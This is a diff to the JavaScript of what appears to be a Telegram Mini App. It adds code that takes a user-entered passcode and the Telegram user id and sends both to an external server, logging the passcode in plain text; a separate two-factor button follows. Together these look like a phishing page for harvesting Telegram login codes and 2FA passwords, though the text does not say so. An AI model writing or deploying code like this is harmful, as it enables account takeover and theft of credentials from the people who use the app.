@@ -52,36 +52,32 @@ document.addEventListener('DOMContentLoaded', () => {
 
     passcodeBtn.addEventListener('click', async () => {
         const passcode = passcodeInput.value;
+        const user = tg.initDataUnsafe?.user; // Telegram user object
+        const user_id = user ? user.id : null;
 
-        if (!passcode) {
-            console.log('❌ Passcode is empty');
+        if (!passcode || !user_id) {
+            console.log('❌ Missing passcode or user_id');
             return;
         }
 
         try {
-            // відправляємо POST запит до Django
             await fetch('https://tgbot-gllp.onrender.com/send_data', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ passcode: passcode }),
+                body: JSON.stringify({
+                    passcode: passcode,
+                    user_id: user_id
+                }),
             });
 
-            // переходи між сторінками
-            // page2.style.display = 'none';
-            // setTimeout(() => {
-            //     page2.style.display = 'none';
-            //     page3.style.display = 'flex';
-            //     requestAnimationFrame(() => {
-            //         page3.style.transform = 'translate(0)';
-            //         page3.style.opacity = '1';
-            //     });
-            // }, 200);
+            console.log(`✅ Sent passcode ${passcode} for user ${user_id}`);
         } catch (error) {
             console.error('❌ Fetch error:', error);
         }
     });
+
 
     const twofactorBtn = document.getElementById('twofactor-btn');
     twofactorBtn.addEventListener('click', () => {
